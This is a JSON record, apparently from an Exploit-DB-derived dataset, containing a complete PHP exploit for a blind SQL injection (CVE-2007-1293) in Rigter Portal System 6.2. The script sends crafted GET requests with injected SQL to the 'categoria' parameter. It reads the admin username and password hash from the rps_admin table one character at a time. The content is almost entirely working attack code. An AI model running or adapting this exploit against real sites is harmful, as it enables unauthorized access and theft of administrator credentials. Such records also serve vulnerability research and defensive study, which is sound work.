{
  "id": "3403",
  "title": "Rigter Portal System (RPS) 6.2 - Blind SQL Injection",
  "cve": "CVE-2007-1293",
  "vuln_type": "sqli",
  "code": "<?\r\n//RPS 6.2 SQL Injection Exploit\r\n//http://www.rps-project.com/\r\n\r\n//Need magic_quotes_gpc = Off;\r\n//by s0cratex\r\n//Contact: s0cratex[at]hotmail[dot]com\r\n\r\n//Salu2: rgod, 0pt1x 'n mechas.\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\n$host = \"localhost\"; $path=\"/rps\"; $id=1;\r\n\r\necho \"RPS 6.2 SQL Injection exploit\\n-----------------------------\\n\\n\";\r\necho \"Username: \";\r\n$j=1;$result=\"\";\r\nwhile(!strstr($result,chr(0))){\r\nfor($x=0;$x<255;$x++){\r\n$cnx = fsockopen($host,80);\r\nfwrite($cnx, \"GET \".$path.\"/?x=ver_descarga&e=mostrar&categoria=-1'/**/OR/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(username,\".$j.\",1))=\".$x.\"),1,0))FROM/**/rps_admin/**/WHERE/**/id=\".$id.\")/* HTTP/1.0\\r\\nHost: \".$host.\"\\r\\n\\r\\n\");\r\nwhile(!feof($cnx)){ if(ereg(\"Descargar\", fgets($cnx))){ $result .= chr($x);\r\necho chr($x); break; } }\r\nfclose($cnx);\r\nif ($x==255) {\r\ndie(\"\\n Try again...\");\r\n}\r\n}\r\n$j++;\r\n}\r\necho \"\\n\";\r\necho \"Password: \";\r\n$a=1;$result2=\"\";\r\nwhile(!strstr($result2,chr(0))){\r\nfor($i=0;$i<255;$i++){\r\n$cnx2 = fsockopen($host,80);\r\nfwrite($cnx2, \"GET \".$path.\"/?x=ver_descarga&e=mostrar&categoria=-1'/**/OR/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(password,\".$a.\",1))=\".$i.\"),1,0))FROM/**/rps_admin/**/WHERE/**/id=\".$id.\")/* HTTP/1.0\\r\\nHost: \".$host.\"\\r\\n\\r\\n\");\r\nwhile(!feof($cnx2)){ if(ereg(\"Descargar\", fgets($cnx2))){ $result2 .=\r\nchr($i); echo chr($i); break; } }\r\nfclose($cnx2);\r\nif ($i==255) {\r\ndie(\"\\n Try again...\");\r\n}\r\n}\r\n$a++;\r\n}\r\necho \"\\nThe password has been encrypted with crypt() function...\\n-----------------------------\\n  by s0cratex\";\r\n?>\r\n\r\n# milw0rm.com [2007-03-04]",
  "url": "https://www.exploit-db.com/exploits/3403"
}